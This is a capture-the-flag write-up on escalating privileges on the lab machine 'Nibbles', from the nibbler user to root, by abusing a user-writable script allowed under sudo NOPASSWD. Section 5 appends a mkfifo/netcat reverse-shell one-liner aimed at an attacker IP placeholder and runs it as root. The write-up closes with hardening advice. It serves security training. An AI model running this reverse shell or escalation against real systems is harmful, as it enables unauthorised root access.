# 15. Nibbles — Privilege Escalation (`nibbler` $\rightarrow$ `root`)

To gain full administrative control over the target system and read the final `root.txt` file, you must escalate privileges from the low-privilege `nibbler` account to **`root` (superuser)**.

---

## 1. Initial Inspection & File Discovery (`personal.zip`)

Enumerating `/home/nibbler` reveals two files:
* `user.txt` (the initial user-level proof file)
* `personal.zip` (a compressed archive)

Extracting the archive with `unzip personal.zip` creates the directory path `personal/stuff/`, containing a shell script named **`monitor.sh`**. Inspecting file permissions confirms that `monitor.sh` is owned by `nibbler` and is **user-writable**, meaning `nibbler` can modify its contents freely.

---

## 2. Automated Enumeration & File Transfer Workflow

Alongside manual inspection, automated post-exploitation enumeration scripts (such as `LinEnum.sh` or `linpeas.sh`) are commonly used to uncover privilege escalation vectors on Linux targets:

1. **Start an HTTP Server on the Attack Box (Kali):**
   ```bash
   python3 -m http.server 8080
   ```
2. **Download the Script onto the Target Machine:**
   ```bash
   wget http://<KALI_IP>:8080/LinEnum.sh
   ```
3. **Grant Execution Permissions & Run:**
   ```bash
   chmod +x LinEnum.sh && ./LinEnum.sh
   ```

---

## 3. Core Vulnerability: Misconfigured Sudo Privileges (`sudo -l`)

Running `sudo -l` (or reviewing the output from `LinEnum.sh`) exposes a critical `sudoers` misconfiguration:

```text
User nibbler may run the following commands on Nibbles:
    (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh
```

### Technical Breakdown
* The `/etc/sudoers` configuration defines which commands specific users may execute with elevated privileges.
* Here, the administrator configured `nibbler` to execute `/home/nibbler/personal/stuff/monitor.sh` as **`root`** without requiring a password (`NOPASSWD`):
  ```bash
  sudo /home/nibbler/personal/stuff/monitor.sh
  ```

---

## 4. Root Cause Analysis (The Logic Flaw)

Two insecure conditions combine to create a direct privilege escalation path:
1. The script is permitted to execute with `root` privileges (`sudo NOPASSWD`).
2. A low-privilege user (`nibbler`) holds **write permissions** on the target script.

Because `nibbler` can modify `monitor.sh`, any arbitrary command appended to the script will execute under the `root` security context when invoked via `sudo`.

---

## 5. Payload Injection & Root Shell Execution

Rather than overwriting the entire file, appending a shell invocation to the end of `monitor.sh` (using `tee -a` or `>>`) preserves existing functionality while injecting our command:

1. **Append a Shell Execution Command to `monitor.sh`:**
   ```bash
   echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ATTACKER_TUN0_IP> 8443 >/tmp/f" | tee -a /home/nibbler/personal/stuff/monitor.sh
   ```
   *(Alternatively, appending `/bin/bash -p` directly spawns an interactive root shell within the current terminal session.)*

2. **Execute the Script via `sudo`:**
   ```bash
   sudo /home/nibbler/personal/stuff/monitor.sh
   ```
   The Linux kernel executes the script as `uid=0` (`root`). When execution reaches the appended line, it spawns a privileged shell running as `uid=0(root) gid=0(root)`.

---

## 6. Post-Exploitation Verification (`root.txt`)

Confirm administrative privileges using `id` (`uid=0(root)`), then navigate to `/root` to verify full system compromise:

```bash
cd /root
cat root.txt
```

---

## Remediation & System Hardening Takeaways

From a defensive administration standpoint, this vulnerability is mitigated through two controls:
1. **Restrict Sudo Paths:** Never grant `sudo` execution privileges on scripts or binaries located inside user-writable directories (such as `/home/<user>/`).
2. **Enforce Strict File Ownership & Permissions:** Any script permitted in `/etc/sudoers` must be owned by `root:root` with write permissions restricted strictly to `root` (`chmod 755` or `chmod 700`).
